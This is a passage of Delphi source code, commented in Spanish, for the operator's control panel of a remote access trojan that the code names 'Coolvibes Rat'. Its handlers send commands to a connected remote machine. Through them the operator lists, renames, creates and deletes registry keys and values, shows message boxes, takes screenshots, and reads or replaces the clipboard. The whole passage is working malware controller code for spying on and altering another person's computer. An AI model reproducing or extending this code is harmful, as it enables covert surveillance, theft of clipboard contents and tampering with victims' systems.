//Lo hacemos en una función a parte para no saturar de código la función OnRead
procedure TFormControl.AniadirClavesARegistro(Claves: String);
var
  Nodo: TTreeNode;
  Clave: String;
begin
  //Borramos los hijos que tenga, para no repetirnos en caso de pulsar dos veces
  //sobre una misma clave
  TreeViewRegedit.Selected.DeleteChildren;
  while Pos('|', Claves) > 0 do
  begin
    Clave := Copy(Claves, 1, Pos('|', Claves) - 1);
    Nodo := TreeViewRegedit.Items.AddChild(TreeViewRegedit.Selected, Clave);
    //Sin seleccionar mostrar el icono de carpeta cerrada
    Nodo.ImageIndex := 1;
    //Seleccionado mostrar el icono de carpeta abierta
    Nodo.SelectedIndex := 0;
    Delete(Claves, 1, Pos('|', Claves));
  end;
  TreeViewRegedit.Selected.Expand(False);
end;

procedure TFormControl.AniadirValoresARegistro(Valores: String);
var
  Item: TListItem;
  Tipo: String;
begin
  ListViewRegistro.Clear;
  while Pos('|', Valores) > 0 do
  begin
    Item := ListViewRegistro.Items.Add;
    //Nombre
    Item.Caption := Copy(Valores, 1, Pos('|', Valores) - 1);
    Delete(Valores, 1, Pos('|', Valores));
    //Tipo
    Tipo := Copy(Valores, 1, Pos('|', Valores) - 1);

    if (Tipo = 'REG_BINARY') or (Tipo = 'REG_DWORD') then
      Item.ImageIndex := 16
    else
      Item.ImageIndex := 15;
    Item.SubItems.Add(Tipo);
    Delete(Valores, 1, Pos('|', Valores));
    //Datos
    Item.SubItems.Add(Copy(Valores, 1, Pos('|', Valores) - 1));
    Delete(Valores, 1, Pos('|', Valores));
  end;
end;

procedure TFormControl.BtnVerRegistoClick(Sender: TObject);
begin
  if Servidor.Connected then
    Servidor.SendText('LISTARVALORES|' + EditPathRegistro.Text)
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.N1Click(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    if PopupRegistro.PopupComponent.ClassType  = TListView then
    begin
      if ListViewRegistro.Selected <> nil then
        //Pone el cursor para editar en el item
        ListViewRegistro.Selected.EditCaption;
    end;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

//Una vez editado el valor le avisamos al server
procedure TFormControl.ListViewRegistroEdited(Sender: TObject;
  Item: TListItem; var S: String);
begin
  Servidor.SendText('NEWNOMBREVALOR|' + EditPathRegistro.Text + '|' + Item.Caption + '|' + S);
end;

procedure TFormControl.Eliminar1Click(Sender: TObject);
begin
  if Servidor.Connected then
  begin
    if PopupRegistro.PopupComponent.ClassType  = TListView then
    begin
      if MessageDlg('¿Está seguro de que quiere borrar el valor ' + ListViewRegistro.Selected.Caption + '?', mtConfirmation, [MbYes, MBNo], 0) <> IdNo then
        Servidor.SendText('BORRARREGISTRO|' + EditPathRegistro.Text + ListViewRegistro.Selected.Caption);
    end
    else
      if MessageDlg('¿Está seguro de que quiere borrar la clave ' + TreeViewRegedit.Selected.Text + '?', mtConfirmation, [MbYes, MBNo], 0) <> IdNo then
        Servidor.SendText('BORRARREGISTRO|' + EditPathRegistro.Text);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.Valoralfanumrico1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_SZ');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.Valorbinerio1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_BINARY');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.valorDWORD1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_DWORD');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.Valordecadenamltiple1Click(Sender: TObject);
var
  NewRegistro: TFormReg;
begin
  if Servidor.Connected then
  begin
    NewRegistro := TFormReg.Create(self, Servidor, EditPathRegistro.Text, 'REG_MULTI_SZ');
    NewRegistro.ShowModal;
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.TreeViewRegeditContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
begin
  //Para que al hacer click derecho sobre un item este pase a estar seleccionado
  if TreeViewRegedit.GetNodeAt(MousePos.X, MousePos.Y) <> nil then
  begin
    TreeViewRegedit.Selected := TreeViewRegedit.GetNodeAt(MousePos.X, MousePos.Y);
    //Desactivamos algunas opciones del popupmenu que no podemos usar con las claves como modificar
    PopupRegistro.Items[1].Enabled := False;
    PopupRegistro.Items[2].Enabled := False;
    //Activamos el resto
    PopupRegistro.Items[3].Enabled := True;
  end
  else //No se ha seleccionado item, así que solo mostramos el menu de nuevo
  begin
    PopupRegistro.Items[1].Enabled := False;
    PopupRegistro.Items[2].Enabled := False;
    PopupRegistro.Items[3].Enabled := False;
  end;
end;

procedure TFormControl.ListViewRegistroContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
begin
  //Se ha seleccionado un item
  if ListViewRegistro.Selected <> nil then
  begin
    //Habilitamos las opciones para trabajar con claves
    PopupRegistro.Items[1].Enabled := True;
    PopupRegistro.Items[2].Enabled := True;
    PopupRegistro.Items[3].Enabled := True;
  end
  else
  begin
    //No se ha seleccionado un item, solo mostramos el menu Nuevo
    PopupRegistro.Items[1].Enabled := False;
    PopupRegistro.Items[2].Enabled := False;
    PopupRegistro.Items[3].Enabled := False;
  end;
end;

procedure TFormControl.Clave1Click(Sender: TObject);
var
  NewClave: String;
begin
  if Servidor.Connected then
  begin
    NewClave := InputBox('Escriba el nombre para la nueva clave.', 'Crear nueva clave', 'NuevaClave');
    if NewClave <> '' then
      Servidor.SendText('NEWCLAVE|' + EditPathRegistro.Text + '|' + NewClave);
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.BtnEnviarMensajeClick(Sender: TObject);
var
  Tipo: String;
begin
  if Servidor.Connected then
  begin
    if RdGrpBotonesMensaje.ItemIndex <> -1 then
    begin
      if  RdBtnError.Checked then
        Tipo := 'warn'
      else if RdBtnPregunta.Checked then
        Tipo := 'ques'
      else if RdBtnExclamacion.Checked then
        Tipo := 'excl'
      else if RdBtnInfo.Checked then
        Tipo := 'info'
      else if RdBtnVacio.Checked then
        Tipo := 'vaci';
      Servidor.SendText('MSJN' + MemoMensaje.Text + '|' + EditTituloMensaje.Text
        + '|' + Tipo + '|' + PChar(inttostr(RdGrpBotonesMensaje.ItemIndex)) + '|');
    end
    else
      MessageDlg('Selecciona algún tipo de botón', mtWarning, [mbok], 0)
  end
  else
    MessageDlg('No estás conectado!', mtWarning, [mbok], 0);
end;

procedure TFormControl.TrackBarCalidadChange(Sender: TObject);
begin
  PosicionCompresJpg.Caption :=IntToStr(TrackBarCalidad.Position) + ' %';
end;

procedure TFormControl.BtnCapturarScreen1Click(Sender: TObject);
begin
  Servidor.SendText('CAPSCREEN' + IntToStr(TrackBarCalidad.Position));
end;

procedure TFormControl.VerenGrande1Click(Sender: TObject);
var
  NewScreenMax: TScreenMax;
begin
  NewScreenMax := TScreenMax.Create(self, ImgCaptura.Picture);
  NewScreenMax.ShowModal; //Form para mostrar la captura más grande...
end;

procedure TFormControl.btnGuardarImagenClick(Sender: TObject);
begin
  DlgGuardar.Title := 'Guardar imagen ::Coolvibes Rat::';
  DlgGuardar.InitialDir := GetCurrentDir();
  DlgGuardar.Filter  := 'Imagen jpeg|*.jpg' ;
  DlgGuardar.DefaultExt := 'jpg';
  if DlgGuardar.Execute then
  begin
    imgCaptura.Picture.SaveToFile(DlgGuardar.FileName ) ;
    StatusBar.Panels[1].Text := 'Imagen guardada como : ' + DlgGuardar.FileName;
  end;
end;



procedure TFormControl.SpeedButton2Click(Sender: TObject);
begin
     If Servidor.Connected Then
     begin
          Servidor.SendText('GETCLIPBOARD');
     end else
     begin
          MessageBox(0,'Servidor no conectado','Error',64);
     end;
end;

procedure TFormControl.SpeedButton3Click(Sender: TObject);
begin
     If Servidor.Connected Then
     begin
          Servidor.SendText('SETCLIPBOARD|'+ Memo1.Text);
     end else
     begin
          MessageBox(0,'Servidor no conectado','Error',64);
     end;
end;

procedure TFormControl.Limpiar1Click(Sender: TObject);
begin
Memo1.Text:= '';
end;

end.//Fin del proyecto
